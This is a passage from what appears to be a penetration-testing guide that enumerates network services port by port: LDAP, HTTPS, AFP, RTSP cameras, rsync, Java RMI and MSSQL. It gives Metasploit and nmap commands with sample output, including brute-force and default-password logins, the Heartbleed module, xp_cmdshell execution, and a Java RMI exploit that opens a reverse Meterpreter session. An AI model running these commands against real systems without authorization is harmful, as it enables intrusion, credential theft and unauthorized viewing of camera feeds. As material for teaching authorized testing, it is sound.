    IP forwarding enabled         : no
    Default TTL                   : 64
    TCP segments received         : 6842
    TCP segments sent             : 6837
    TCP segments retrans          : 0
    Input datagrams               : 243052379
    Delivered datagrams           : 192775346
    Output datagrams              : 993667
```

# Port 389/636 - LDAP

Lightweight Directory Access Protocol.  

This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. LDAP directory can be understood a bit like the windows registry. A database-tree. LDAP is sometimes used to store user information and is used more often used in corporate structure.

Web applications can use ldap for authentication. If that is the case it is possible to perform **ldap-injections** which are similar to SQL injections.

You can sometimes access LDAP using a anonymous login. This can be useful because you might find some valuable data, about users.

Port 636 is used for SSL.

## Nmap

### LDAP-rootdse

<a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html" class="reference external">ldap-rootdse.nse</a> : Retrieves the LDAP root DSA-specific Entry (DSE)

Sample Output:

    nmap -p 389 --script ldap-rootdse <host>
    nmap -p 389 --script ldap-rootdse 172.16.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-03 23:05 IST
    Nmap scan report for 172.16.xx.xx
    Host is up (0.015s latency).
    PORT    STATE SERVICE
    389/tcp open  ldap
    | ldap-rootdse:
    | LDAP Results
    |   <ROOT>
    |       currentTime: 20160503173447.0Z
    |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: DC=xxxpcx,DC=com
    |       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
    |       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
    |       defaultNamingContext: DC=xxxpcx,DC=com
    |       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
    |       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
    |       rootDomainNamingContext: DC=xxxpcx,DC=com
    |       supportedControl: 1.2.xx.xx.1.4.319
    |       supportedControl: 1.2.xx.xx.1.4.801
    |       supportedControl: 1.2.xx.xx.1.4.473
    |       supportedControl: 1.2.xx.xx.1.4.528
    |       supportedControl: 1.2.xx.xx.1.4.417
    |       supportedControl: 1.2.xx.xx.1.4.619
    |       supportedControl: 1.2.xx.xx.1.4.841
    |       supportedControl: 1.2.xx.xx.1.4.529
    |       supportedControl: 1.2.xx.xx.1.4.805
    |       supportedControl: 1.2.xx.xx.1.4.521
    |       supportedControl: 1.2.xx.xx.1.4.970
    |       supportedControl: 1.2.xx.xx.1.4.1338
    |       supportedControl: 1.2.xx.xx.1.4.474
    |       supportedControl: 1.2.xx.xx.1.4.1339
    |       supportedControl: 1.2.xx.xx.1.4.1340
    |       supportedControl: 1.2.xx.xx.1.4.1413
    |       supportedControl: 2.16.xx.xx.113730.3.4.9
    |       supportedControl: 2.16.xx.xx.113730.3.4.10
    |       supportedControl: 1.2.xx.xx.1.4.1504
    |       supportedControl: 1.2.xx.xx.1.4.1852
    |       supportedControl: 1.2.xx.xx.1.4.802
    |       supportedControl: 1.2.xx.xx.1.4.1907
    |         supportedControl: 1.2.xx.xx.1.4.1948
    |       supportedControl: 1.2.xx.xx.1.4.1974
    |       supportedControl: 1.2.xx.xx.1.4.1341
    |       supportedControl: 1.2.xx.xx.1.4.2026
    |       supportedControl: 1.2.xx.xx.1.4.2064
    |       supportedControl: 1.2.xx.xx.1.4.2065
    |       supportedControl: 1.2.xx.xx.1.4.2066
    |       supportedControl: 1.2.xx.xx.1.4.2090
    |       supportedControl: 1.2.xx.xx.1.4.2205
    |       supportedControl: 1.2.xx.xx.1.4.2204
    |       supportedControl: 1.2.xx.xx.1.4.2206
    |       supportedControl: 1.2.xx.xx.1.4.2211
    |       supportedControl: 1.2.xx.xx.1.4.2239
    |       supportedControl: 1.2.xx.xx.1.4.2255
    |       supportedControl: 1.2.xx.xx.1.4.2256
    |       supportedLDAPVersion: 3
    |       supportedLDAPVersion: 2
    |       supportedLDAPPolicies: MaxPoolThreads
    |       supportedLDAPPolicies: MaxPercentDirSyncRequests
    |       supportedLDAPPolicies: MaxDatagramRecv
    |       supportedLDAPPolicies: MaxReceiveBuffer
    |       supportedLDAPPolicies: InitRecvTimeout
    |       supportedLDAPPolicies: MaxConnections
    |       supportedLDAPPolicies: MaxConnIdleTime
    |       supportedLDAPPolicies: MaxPageSize
    |       supportedLDAPPolicies: MaxBatchReturnMessages
    |       supportedLDAPPolicies: MaxQueryDuration
    |       supportedLDAPPolicies: MaxTempTableSize
    |       supportedLDAPPolicies: MaxResultSetSize
    |       supportedLDAPPolicies: MinResultSets
    |       supportedLDAPPolicies: MaxResultSetsPerConn
    |       supportedLDAPPolicies: MaxNotificationPerConn
    |       supportedLDAPPolicies: MaxValRange
    |       supportedLDAPPolicies: MaxValRangeTransitive
    |       supportedLDAPPolicies: ThreadMemoryLimit
    |       supportedLDAPPolicies: SystemMemoryLimitPercent
    |       highestCommittedUSN: 70892
    |       supportedSASLMechanisms: GSSAPI
    |       supportedSASLMechanisms: GSS-SPNEGO
    |       supportedSASLMechanisms: EXTERNAL
    |       supportedSASLMechanisms: DIGEST-MD5
    |       dnsHostName: SCN-DC01.xxxpcx.com
    |       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
    |       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
    |       supportedCapabilities: 1.2.xx.xx.1.4.800
    |       supportedCapabilities: 1.2.xx.xx.1.4.1670
    |       supportedCapabilities: 1.2.xx.xx.1.4.1791
    |       supportedCapabilities: 1.2.xx.xx.1.4.1935
    |       supportedCapabilities: 1.2.xx.xx.1.4.2080
    |       supportedCapabilities: 1.2.xx.xx.1.4.2237
    |       isSynchronized: TRUE
    |       isGlobalCatalogReady: TRUE
    |       domainFunctionality: 3
    |       forestFunctionality: 3
    |_      domainControllerFunctionality: 6

    Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

### ldap-search

<a href="https://nmap.org/nsedoc/scripts/ldap-search.html" class="reference external">ldap-search.nse</a> : Attempts to perform an LDAP search and returns all matches.

If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.

Sample Output:

    nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
    ldap.qfilter=users,ldap.attrib=sAMAccountName' <host>

    nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
    ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' <host>

### ldap-brute

<a href="https://nmap.org/nsedoc/scripts/ldap-brute.html" class="reference external">ldap-brute.nse</a> : Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments. This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceeds the amount of allowed tries, accounts will be locked out. This usually happens very quickly.

## Other

### ldapsearch

Anonymous LDAP Binding allows a client to connect and search the directory (bind and search) without logging in. You do not need to include binddn and bindpasswd.

If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query

    ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
    -h ldap server
    -p port of ldap
    -x simple authentication
    -b search base
    -s scope is defined as base

Sample Output
```
    ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
    # extended LDIF
    #
    # LDAPv3
    # base <> with scope baseObject
    # filter: (objectClass=*)
    # requesting: * +
    #

    #
    dn:
    objectClass: top
    objectClass: OpenLDAProotDSE
    structuralObjectClass: OpenLDAProotDSE
    configContext: cn=config
    namingContexts: dc=example,dc=com
    supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1
    supportedControl: 2.16.xx.xx.113730.3.4.18
    supportedControl: 2.16.xx.xx.113730.3.4.2
    supportedControl: 1.3.xx.xx.4.1.4203.1.10.1
    supportedControl: 1.2.xx.xx.1.4.319
    supportedControl: 1.2.xx.xx.1.334810.2.3
    supportedControl: 1.2.xx.xx.1.3344810.2.3
    supportedControl: 1.3.xx.xx.1.13.2
    supportedControl: 1.3.xx.xx.1.13.1
    supportedControl: 1.3.xx.xx.1.12
    supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1
    supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3
    supportedFeatures: 1.3.xx.xx.1.14
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4
    supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5
    supportedLDAPVersion: 3
    entryDN:
    subschemaSubentry: cn=Subschema

    # search result
    search: 2
    result: 0 Success

    # numResponses: 2
    # numEntries: 1
```
Once you are aware of the base name in the above example “example.com” we can query for ldap users etc. by

    ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"

Sample Output

    # johnsmith, EXAUSERS, People, example.com
    dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com
    displayName: John Smith
    ntUserLastLogon: 130150432350834365
    givenName: John
    objectClass: top
    objectClass: person
    objectClass: organizationalperson
    objectClass: inetOrgPerson
    objectClass: ntUser
    objectClass: shadowAccount
    uid: johnsmith
    cn: John Smith
    ntUserCodePage: 0
    ntUserDomainId: johnsmith
    ntUserLastLogoff: 0
    ntUniqueId: 75ac21092c755e42b2129a224eb328dd
    ntUserDeleteAccount: true
    ntUserAcctExpires: 9223372036854775807
    sn: John


# Port 443 - HTTPS

Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on [client-side vulnerabilities](../http-web-vulnerabilities/attacking-the-system/).

## HTTPS Enumeration <a id="443enum"></a>

1. Initial scan for misconfigurations and vulnerabilities with nikto:  
  `nikto -h https://10.10.10.140`

  > Make sure to run scan interesting directories as well!

2. Check SSL/TLS with sslscan: `sslscan`
3. Brute force to find hidden directories and items: `dirb`

## Common Vulnerabilities

**Heartbleed**

OpenSSL 1.0.1 through 1.0.1f \(inclusive\) are vulnerable  
OpenSSL 1.0.1g is NOT vulnerable  
OpenSSL 1.0.0 branch is NOT vulnerable  
OpenSSL 0.9.8 branch is NOT vulnerable

First we need to investigate if the https-page is vulnerable to [heartbleed](http://heartbleed.com/)

We can do that the following way.

```text
sudo sslscan 192.168.101.1:443
```

or using a nmap script

```text
nmap -sV --script=ssl-heartbleed 192.168.101.8
```

You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.

```text
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
```

Now you have a flow of random data, some of it might be of interest to you.

**CRIME**

**Breach**

## Certificates

Read the certificate.

* Does it include names that might be useful?
* Correct vhost

# Port 548 - AFP

AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.

## Metasploit

Two auxiliary modules available.

### Apple Filing Protocol Info Enumerator

    use auxiliary/scanner/afp/afp_server_info
    services -p 548 -u -S AFP -R

Sample output:
```
    [*] AFP 10.11.xx.xx Scanning...
    [*] AFP 10.11.xx.xx:548:548 AFP:
    [*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule
    [*] AFP 10.11.xx.xx:548  Server Flags:
    [*] AFP 10.11.xx.xx:548     *  Super Client: true
    [*] AFP 10.11.xx.xx:548     *  UUIDs: true
    [*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true
    [*] AFP 10.11.xx.xx:548     *  Open Directory: true
    [*] AFP 10.11.xx.xx:548     *  Reconnect: true
    [*] AFP 10.11.xx.xx:548     *  Server Notifications: true
    [*] AFP 10.11.xx.xx:548     *  TCP/IP: true
    [*] AFP 10.11.xx.xx:548     *  Server Signature: true
    [*] AFP 10.11.xx.xx:548     *  Server Messages: true
    [*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false
    [*] AFP 10.11.xx.xx:548     *  Password Changing: true
    [*] AFP 10.11.xx.xx:548     *  Copy File: true
    [*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119
    [*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1
    [*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1
    [*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d
    [*] AFP 10.11.xx.xx:548  Server Network Address:
    [*] AFP 10.11.xx.xx:548     *  10.11.4.76:548
    [*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548
    [*] AFP 10.11.xx.xx:548     *  10.11.4.76
    [*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example's AirPort Time Capsule
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
```
### Apple Filing Protocol Login Utility

Attempt to bruteforce authentication credentials for AFP.

## Nmap

### afp-serverinfo

<a href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html" class="reference external">afp-serverinfo.nse</a> : Shows AFP server information.

### afp-brute

<a href="https://nmap.org/nsedoc/scripts/afp-brute.html" class="reference external">afp-brute.nse</a> : Performs password guessing against Apple Filing Protocol (AFP).

### afp-ls

<a href="https://nmap.org/nsedoc/scripts/afp-ls.html" class="reference external">afp-ls.nse</a> : Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.

### afp-showmount

<a href="https://nmap.org/nsedoc/scripts/afp-showmount.html" class="reference external">afp-showmount.nse</a> : Shows AFP shares and ACLs.

### afp-path-vuln

<a href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html" class="reference external">afp-path-vuln.nse</a> : Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.

# Port 554 - RTSP

RTSP \(Real Time Streaming Protocol\) is a stateful protocol built on top of tcp usually used for streaming images. Many commercial IP-cameras are running on this port. They often have a GUI interface, so look out for that.

## Nmap

Two NSE for RTSP which are

### rtsp-methods

<a href="https://nmap.org/nsedoc/scripts/rtsp-methods.html" class="reference external">rtsp-methods.nse</a> : which determines which methods are supported by the RTSP (real time streaming protocol) server

RTSP-Methods Sample Output:
```
    nmap -p 8554 --script rtsp-methods 10.10.xx.xx -sV

    Starting Nmap 7.01 (https://nmap.org) at 2016-04-01 23:17 IST
    Nmap scan report for 10.10.xx.xx (10.10.22.195)
    Host is up (0.015s latency).
    PORT     STATE SERVICE VERSION
    8554/tcp open  rtsp    Geovision webcam rtspd
    |_rtsp-methods: OPTIONS, DESCRIBE, SETUP, PLAY, PAUSE, TEARDOWN
    Service Info: Device: webcam
```

### rtsp-url-brute

<a href="https://nmap.org/nsedoc/scripts/rtsp-url-brute.html" class="reference external">rtsp-url-brute.nse</a> which Attempts to enumerate RTSP media URLS by testing for common paths on devices such as surveillance IP cameras.

RTSP URL Brute Sample Output:

    Nmap scan report for 10.152.77.206
    Host is up (0.00047s latency).
    PORT    STATE SERVICE
    554/tcp open  rtsp
    | rtsp-url-brute:
    |   Discovered URLs
    |     rtsp://10.152.77.206/media/video1
    |_    rtsp://10.152.77.206/video1

Once you have this, just execute mplayer to watch the live feed

    mplayer <url>
    for example: mplayer rtsp://10.152.77.206/media/video1

## Other

### Cameradar

<a href="https://github.com/EtixLabs/cameradar" class="reference external">Cameradar</a> : An RTSP surveillance camera access multitool

Cameradar allows you to:

-   Detect open RTSP hosts on any accessible target
-   Get their public info (hostname, port, camera model, etc.)
-   Launch automated dictionary attacks to get their stream route (for example /live.sdp)
-   Launch automated dictionary attacks to get the username and password of the cameras
-   Generate thumbnails from them to check if the streams are valid and to have a quick preview of their content
-   Try to create a Gstreamer pipeline to check if they are properly encoded
-   Print a summary of all the informations Cameradar could get


# Port 587 - Submission

Outgoing smtp-port

If Postfix is run on it it could be vunerable to shellshock  
[https://www.exploit-db.com/exploits/34896/](https://www.exploit-db.com/exploits/34896/)

# Port 631 - CUPS

Common UNIX Printing System has become the standard for sharing printers on a linux-network.  
You will often see port 631 open in your priv-esc enumeration when you run `netstat`. You can log in to it here: [http://localhost:631/admin](http://localhost:631/admin)

You authenticate with the OS-users.

Find version. Test **cups-config --version**. If this does not work surf to [http://localhost:631/printers](http://localhost:631/printers) and see the CUPS version in the title bar of your browser.

There are vulnerabilities for it so check your searchsploit.

# Port 873 - Rsync

    services -p 873 -u -S rsync -R

## Metasploit

### List Rsync Modules

An rsync module is essentially a directory share. These modules can optionally be protected by a password. This module connects to and negotiates with an rsync server, lists the available modules and, optionally, determines if the module requires a password to access.

    use auxiliary/scanner/rsync/modules_list
    services -p 873 -u -S rsync -R

Sample Output:
```
    [+] 10.10.xx.xx:873 - 5 rsync modules found: OTG DATA, Server IMP Backup, Rajan Data, test, testing
    [*] Scanned 1 of 4 hosts (25% complete)
    [*] 10.10.xx.xx:873 - no rsync modules found
    [*] Scanned 2 of 4 hosts (50% complete)
    [*] Scanned 3 of 4 hosts (75% complete)
    [*] Scanned 4 of 4 hosts (100% complete)
    [*] Auxiliary module execution completed
```
## Nmap

### rsync-list-modules

<a href="https://nmap.org/nsedoc/scripts/rsync-list-modules.html" class="reference external">rsync-list-modules.nse</a> : Lists modules available for rsync (remote file sync) synchronization.

    nmap -p 873 XX.XX.XX.52 --script=rsync-list-modules

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-06 00:05 IST
    Nmap scan report for XX.XX.243.52
    Host is up (0.0088s latency).
    PORT    STATE SERVICE
    873/tcp open  rsync
    | rsync-list-modules:
    |   mail
    |   varlib
    |   etc
    |   net
    |   dar
    |   usrlocal
    |   varlog
    |   var
    |_  root

    Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds

## Other

### rsync

How to test your rsync setup:

List the available shares by running (may require a password)

    rsync rsync://share@your-ip-or-hostname/

Sample Output:

    rsync rsync://etc@XX.XX.XX.52
    mail
    varlib
    etc
    net
    dar
    usrlocal
    varlog
    var
    root

After entering your password, rsync should now give a file listing

    rsync rsync://pub@your-ip-or-hostname/pub/

We may get access denied because of the IP address restrictions

    rsync rsync://etc@XX.XX.XX.52/mail
    @ERROR: access denied to mail from unknown (XX.4.XX.XX)
    rsync error: error starting client-server protocol (code 5) at main.c(1653) [Receiver=3.1.1]

Run:

    rsync -v --progress --partial rsync://pub@your-ip-or-hostname/pub/someFile

    (you can abbreviate --partial --progress as -P). Your file should now be downloading.

Run:

    rsync -aPv rsync://pub@your-ip-or-hostname/pub/someDirectory .
    Your directory should now be downloading


# Port 993 - IMAP Encrypted

The default port for the Imap-protocol.

# Port 995 - POP3 Encrypten

Port 995 is the default port for the **Post Office Protocol**.  
The protocol is used for clients to connect to the server and download their emails locally.  
You usually see this port open on mx-servers. Servers that are meant to send and recieve email.

Related ports:  
110 is the POP3 non-encrypted.

25, 465

# Port 1025 - NFS or IIS

I have seen them open on windows machine. But nothing has been listening on it.

# Port 1030/1032/1033/1038

I think these are used by the RPC within Windows Domains. I have found no use for them so far. But they might indicate that the target is part of a Windows domain. Not sure though.

# Port 1099 - Java RMI

## Metasploit

### Java RMI Server Insecure Endpoint Code Execution Scanner

Detects RMI endpoints:

    use auxiliary/scanner/misc/java_rmi_server
    services -u -p 1099 -S Java -R

Failed output:
```
    [*] 172.30.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Disabled
```
Successful output:
```
    [+] 192.168.xx.xx:1099 Java RMI Endpoint Detected: Class Loader Enabled
```
and then use

### Java RMI Server Insecure Default Configuration Java Code Execution

Module takes advantage of the default configuration of the RMI Registry and RMI Activation services, which allow loading classes from any remote (HTTP) URL. As it invokes a method in the RMI Distributed Garbage Collector which is available via every RMI endpoint, it can be used against both rmiregistry and rmid, and against most other (custom) RMI endpoints as well. Note that it does not work against Java Management Extension (JMX) ports since those do not support remote class loading, unless another RMI endpoint is active in the same Java process. RMI method calls do not support or require any sort of authentication

    use exploit/multi/misc/java_rmi_server

Sample Output
```
    use exploit/multi/misc/java_rmi_server
    msf exploit(java_rmi_server) > set rhost 192.168.xx.xx
    rhost => 192.168.xx.xx
    msf exploit(java_rmi_server) > run

    [*] Started reverse TCP handler on 192.168.xx.xx:4444
    [*] Using URL: http://0.0.xx.xx:8080/LAWVrAFTItH7N
    [*] Local IP: http://192.168.xx.xx:8080/LAWVrAFTItH7N
    [*] Server started.
    [*] 192.168.xx.xx:1099 - Sending RMI Header...
    [*] 192.168.xx.xx:1099 - Sending RMI Call...
    [*] 192.168.xx.xx     java_rmi_server - Replied to request for payload JAR
    [*] Sending stage (45741 bytes) to 192.168.xx.xx
    [*] Meterpreter session 1 opened (192.168.xx.xx:4444 -> 192.168.7.87:3899) at 2016-05-03 18:24:53 +0530
    [-] Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn't get a payload request
    [*] Server stopped.
```
Here’s a video of Mubix exploiting it from Metasploit Minute <a href="https://hak5.org/episodes/metasploit-minute/exploitation-using-java-rmi-service-metasploit-minute" class="reference external">Exploitation using java rmi service</a>

## Nmap

### rmi-vuln-classloader

<a href="https://nmap.org/nsedoc/scripts/rmi-vuln-classloader.html" class="reference external">rmi-vuln-classloader.nse</a> Tests whether Java rmiregistry allows class loading. The default configuration of rmiregistry allows loading classes from remote URLs, which can lead to remote code execution. The vendor (Oracle/Sun) classifies this as a design feature.

Sample Output:

    nmap --script=rmi-vuln-classloader -p 1099 192.168.xx.xx

    Starting Nmap 7.01 (https://nmap.org) at 2016-05-04 00:04 IST
    Nmap scan report for 192.168.xx.xx
    Host is up (0.0011s latency).
    PORT     STATE SERVICE
    1099/tcp open  rmiregistry
    | rmi-vuln-classloader:
    |   VULNERABLE:
    |   RMI registry default configuration remote code execution vulnerability
    |     State: VULNERABLE
    |       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
    |
    |     References:
    |_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
    Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds


# Port 1433 - MSSQL

## Interacting with MSSQL

### Connection

```text
sqsh -S 192.168.1.101 -U sa
```

### Execute commands

```bash
To execute the date command to the following after logging in
xp_cmdshell 'date'
go
```

## Metasploit

**MS-SQL** is really vast multiple **metasploit** modules and blogs existing on the internet, Let’s check **Metasploit Modules** one by one.

    auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
    auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
    auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
    auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
    auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
    auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
    auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
    auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
    auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
    auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
    auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
    auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
    auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
    auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
    auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
    auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
    auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
    auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
    auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
    auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
    auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump

### MSSQL Ping Utility

Queries the MSSQL instance for information. This will also provide if any ms-sql is running on different ports.

    use auxiliary/scanner/mssql/mssql_ping
    services -p 1433 -R

Sample output:
```
    [*] SQL Server information for 10.10.xx.xx:
    [+]    ServerName      = SAPBWBI
    [+]    InstanceName    = BOE140
    [+]    IsClustered     = No
    [+]    Version         = 10.0.xx.xx
    [+]    tcp             = 50623
    [+]    np              = \\SAPBWBI\pipe\MSSQL$BOE140\sql\query
    [*] SQL Server information for 10.10.xx.xx:
    [+]    ServerName      = MANGOOSE
    [+]    InstanceName    = MSSQLSERVER
    [+]    IsClustered     = No
    [+]    Version         = 11.0.xx.xx
    [+]    tcp             = 1433
    [*] SQL Server information for 10.10.xx.xx:
    [+]    ServerName      = MHE-DMP
    [+]    InstanceName    = MSSQLSERVER
    [+]    IsClustered     = No
    [+]    Version         = 11.0.xx.xx
    [+]    tcp             = 1433
    [*] SQL Server information for 10.10.xx.xx:
    [+]    ServerName      = MHE-DMP
    [+]    InstanceName    = MHE_DMP_LIVE
    [+]    IsClustered     = No
    [+]    Version         = 11.0.xx.xx
    [+]    tcp             = 53029
```
After discovering the ms-sql instances, we can check if their are any default passwords.

### MSSQL Login Utility

Let’s see if we have any default passwords. This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank) we always find default passwords such as <a href="mailto:company%40123" class="reference external">company<span>@</span>123</a> etc. Once in an engagement, out of 200 Ms-sql instance we found around 60 default passwords. ;)

    use auxiliary/scanner/mssql/mssql_login
    set Password company@123
    services -p 1433 -R

Sample Output:
```
    [*] 10.10.xx.xx:1433 - MSSQL - Starting authentication scanner.
    [+] 10.10.xx.xx:1433 - LOGIN SUCCESSFUL: WORKSTATION\sa:company@123
    [-] 10.10.xx.xx:1433 MSSQL - LOGIN FAILED: WORKSTATION\sa:company@123 (Incorrect:)
```
Once, we have the credentials to the SQL Server we can use

### Microsoft SQL Server Configuration Enumerator

    use auxiliary/admin/mssql/mssql_enum
    set rhost 10.10.xx.xx
    set password company@123

Sample Output:
```
    [*] Running MS SQL Server Enumeration...
    [*] Version:
    [*]    Microsoft SQL Server 2012 - 11.0.xx.xx (X64)
    [*]            Feb 10 2012 19:39:15
    [*]            Copyright (c) Microsoft Corporation
    [*]            Enterprise Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
    [*] Configuration Parameters:
    [*]    C2 Audit Mode is Not Enabled
    [*]    xp_cmdshell is Enabled
    [*]    remote access is Enabled
    [*]    allow updates is Not Enabled
    [*]    Database Mail XPs is Not Enabled
    [*]    Ole Automation Procedures are Not Enabled
    [*] Databases on the server:
    [*]    Database name:master
    [*]    Database Files for master:
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\master.mdf
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\mastlog.ldf
    [*]    Database name:tempdb
    [*]    Database Files for tempdb:
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\tempdb.mdf
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\templog.ldf
    [*]    Database name:model
    [*]    Database Files for model:
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\model.mdf
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\modellog.ldf
    [*]    Database name:msdb
    [*]    Database Files for msdb:
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBData.mdf
    [*]            C:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\DATA\MSDBLog.ldf
    [*]    Database name:ReportServer
    [*]    Database Files for ReportServer:
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer.mdf
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServer_log.ldf
    [*]    Database name:ReportServerTempDB
    [*]    Database Files for ReportServerTempDB:
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB.mdf
    [*]            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Data\ReportServerTempDB_log.ldf
    [*] System Logins on this Server:
    [*]    sa
    [*]    ##MS_SQLResourceSigningCertificate##
    [*]    ##MS_SQLReplicationSigningCertificate##
    [*]    ##MS_SQLAuthenticatorCertificate##
    [*]    ##MS_PolicySigningCertificate##
    [*]    ##MS_SmoExtendedSigningCertificate##
    [*]    ##MS_PolicyEventProcessingLogin##
    [*]    ##MS_PolicyTsqlExecutionLogin##
    [*]    ##MS_AgentSigningCertificate##
